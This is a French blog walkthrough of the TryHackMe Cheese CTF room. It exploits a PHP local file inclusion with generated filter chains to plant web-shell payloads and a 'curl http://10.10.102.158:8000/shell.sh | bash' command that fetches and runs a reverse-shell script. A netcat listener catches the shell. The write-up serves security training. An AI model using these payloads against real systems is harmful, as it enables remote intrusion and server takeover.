---
title: "TryHackMe Room Cheesectfv10"
seoTitle: "Cheesectfv10: Explore the TryHackMe Challenge"
seoDescription: "Learn how to gain shell access using reverse shells and PHP filter chains in the TryHackMe Cheese CTF Room"
datePublished: Tue May 06 2025 16:06:14 GMT+0000 (Coordinated Universal Time)
cuid: cmacpbxs0000109ikes4r0u3m
slug: tryhackme-room-cheesectfv10
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1746543221556/353365c1-1112-43c2-973d-890a1e22c750.png
tags: shell, cybersecurity-1, tryhackme, tryhackme-walkthrough, cheesectfv10

---

Lien de la room: [TryHackMe | Cheese CTF](https://tryhackme.com/room/cheesectfv10)

# Gain Shell Acces

## Avec le paramètre cmd

1. Créer un fichier `shell.sh` pour mon script de reverse shell. On veut donc initier la connexion depuis la machine cible.
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746544143626/615e08b3-a3e5-4eaa-91cc-19bea55574bf.png align="center")

2. Démarrer le listener netcat sur la machine principale pour écouter les connexions entrantes sur le port 4444
    

```bash
nc -lvnp 4444
```

3. Démarrer un serveur HTTP qui va contenir le fichier `shell.sh`. Le fichier doit être dans le le répertoire courant où vous exécutez la commande.
    

```bash
python -m http.server 8000
```

4. Utiliser l’outil [php\_filter\_chain\_generator](https://github.com/synacktiv/php_filter_chain_generator) pour générer la chaîne de filtres PHP
    

```bash
python3 attack.py --chain '<?php system($_GET["cmd"]); ?>' 
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746544061591/53a75b57-8673-40b2-855d-4f3f19525946.png align="center")

Ici on utilise `'<?php system($_GET["cmd"]); ?>'` car on veut exécuter des commandes sur le serveur cible via le paramètre `cmd` dans l’URL. On veut exploiter une vulnérabilité de type Local File Inclusion LFI afin d’exécuter des commandes arbitraires sur la cible.

5. Modifier l’URL vulnérable pour y ajouter `la chaîne de filtres PHP générée` et le paramètre `cmd`.
    

URL de base: <mark>http://10.10.162.24/secret-script.php?file=php://filter/resource=users.html</mark>

Début de la chaîne de filtre PHP : <mark>php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode</mark>

Fin de la chaîne de filtre PHP: <mark>UTF8.UTF7|convert.base64-decode/resource=php://temp</mark>

On rajoute donc le paramètre <mark>&amp;cmd=curl http://10.10.102.158:8000/shell.sh | bash</mark> à la fin de la chaîne de filtre PHP et on obtient ainsi le reverse shell.

* `curl http://10.10.102.158:8000/revshell.sh`: utilise l’outil curl pour télécharger le fichier shell.sh depuis le serveur HTTP sur le port 80
    
* `| bash`: redirige la sortie de la commande curl vers l’interpréteur de commandes bash, pour exécuter le script.
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746547286658/cabf2748-9b25-4180-8215-00b55abacc29.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746545277448/eb5f10ea-c90f-4b52-865c-e53d93920002.png align="center")

## Avec curl

On peut aussi spécifier directement la commande curl dans le payload lors de la génération de la chaîne de filtres PHP. C’est une alternative pour exécuter directement la commande curl sur le serveur, sans avoir à passer de paramètres supplémentaires à l’URL.

```bash
python3 attack.py --chain '<?= `curl 10.10.102.158:8000/shell.sh | bash` ?>'
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746548656865/269b63b9-85e4-44f9-9f18-439422d48219.png align="center")

Ce payload utilise la syntaxe courte `<?= ?>` pour exécuter la commande `curl` qui télécharge et exécute le script `shell.sh` depuis le serveur HTTP.

Une fois la chaîne de filtres générée, on peut l’intégrer dans l’URL et obtenir l’accès sur la machine en reverse shell.